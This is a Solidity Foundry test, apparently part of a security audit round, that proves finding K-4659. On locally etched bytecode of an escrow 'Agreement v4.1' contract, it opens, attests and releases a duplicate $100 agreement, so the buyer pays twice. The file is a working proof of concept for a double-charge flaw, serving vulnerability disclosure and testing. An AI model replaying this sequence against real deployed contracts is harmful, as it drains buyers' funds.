// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Mocks.sol";

// ROUND 40-A2 — Team A (Major 40). Live SDK b6e7d25c, Agreement v4.1 live bytecode.
// K-4659 (M-2309): resume-state baselineId tamper -> double-open. The JS side
// (baselineId NOT in settleStateMessage's signed core; runSettleMachine
// adopts only agreements with id > baselineId) is proven by the pure test
// (test-settle-pure-round40.mjs) and the node PoC (node-result-k4659.json:
// agreement 2 opened, buyer locked a second $100, seller +$100 on release).
// This forge test proves the ON-CHAIN leg on live bytecode: a second
// createAgreement with the SAME payee/asset/amount/termsHash/conditions as
// the first (only the expiry differs by 1s, as in a later resume) succeeds,
// and attest + release on the duplicate pays the seller a second $100.
// Throwaway local keys only. No mainnet, no live calls.

interface IAgreementV41 {
    struct Cond { uint8 kind; address target; bytes data; uint256 value; }
    struct AgrP { address payee; address asset; uint256 amount; uint64 expiry; bytes32 termsHash; Cond[] conditions; }
    struct Fee { uint256 feeWei; uint64 expiry; bytes sig; }
    function createAgreement(AgrP calldata p, Fee calldata q) external payable returns (uint256);
    function attest(uint256 id, uint256 index) external returns (bool);
    function release(uint256 id) external returns (bool);
}

contract Round40A2Test is Test {
    address constant AGREEMENT = 0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6;

    uint256 constant VICTIM_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant SELLER_PK = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
    uint256 constant ARBITER_PK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    address victim;
    address seller;
    address arbiter;

    MockERC20 usdg;

    function setUp() public {
        vm.chainId(4663);
        victim = vm.addr(VICTIM_PK);
        seller = vm.addr(SELLER_PK);
        arbiter = vm.addr(ARBITER_PK);
        vm.etch(AGREEMENT, vm.parseBytes(vm.readFile("bytecode/agreement-v41-zerofee.hex")));
        vm.store(AGREEMENT, bytes32(uint256(11)), bytes32(uint256(1))); // guard unlocked (v4.1 slot 11)
        vm.store(AGREEMENT, bytes32(uint256(0)), bytes32(uint256(1))); // nextId = 1
        vm.warp(1_700_000_000);
        vm.deal(victim, 100 ether);
        usdg = new MockERC20();
        usdg.mint(victim, 1_000_000 * 10 ** 6);
    }

    function _create100(bytes32 tag, uint64 expiry) internal returns (uint256 id) {
        IAgreementV41.Cond[] memory conds = new IAgreementV41.Cond[](1);
        conds[0] = IAgreementV41.Cond({ kind: 1, target: arbiter, data: "", value: 0 });
        vm.prank(victim);
        usdg.approve(AGREEMENT, 100 * 10 ** 6);
        vm.prank(victim);
        id = IAgreementV41(AGREEMENT).createAgreement(
            IAgreementV41.AgrP({ payee: seller, asset: address(usdg), amount: 100 * 10 ** 6, expiry: expiry, termsHash: tag, conditions: conds }),
            IAgreementV41.Fee({ feeWei: 0, expiry: uint64(block.timestamp + 3600), sig: new bytes(65) })
        );
    }

    // K-4659: duplicate $100 agreement (same terms tag) opens, attests, releases.
    function testK4659_DoubleOpenSecondAgreementPaysSellerAgain() public {
        bytes32 tag = keccak256("settle:aabbccddeeff0011\nDeliver the report");
        uint256 buyerBefore = usdg.balanceOf(victim);
        uint256 sellerBefore = usdg.balanceOf(seller);
        uint256 id1 = _create100(tag, uint64(block.timestamp + 72 hours));
        assertEq(id1, 1, "first agreement must be id 1");
        assertEq(usdg.balanceOf(victim), buyerBefore - 100 * 10 ** 6, "buyer locked first $100");
        vm.warp(block.timestamp + 1); // later resume: expiry differs by 1s, so no duplicate-guard revert
        uint256 id2 = _create100(tag, uint64(block.timestamp + 72 hours));
        assertEq(id2, 2, "second (duplicate) agreement must be id 2");
        assertEq(usdg.balanceOf(victim), buyerBefore - 200 * 10 ** 6, "buyer locked a second $100");
        vm.prank(arbiter);
        // NOTE (coordinator re-probe): live v4.1 attest()/release() do not
        // return ABI-decodable bool data — the typed interface call reverts
        // in the TEST's decoder even though the on-chain call succeeds
        // (trace: attest emits its event, stops with no returndata).
        // Prior passing tests (Round12A) use low-level calls + ok flag.
        (bool aok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0xa3bb24cc), id2, uint256(0)));
        assertTrue(aok, "arbiter attests the duplicate");
        (bool rok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0x37bdc99b), id2));
        assertTrue(rok, "duplicate releases");
        assertEq(usdg.balanceOf(seller) - sellerBefore, 100 * 10 ** 6, "seller gained a second $100 from the duplicate");
    }
}
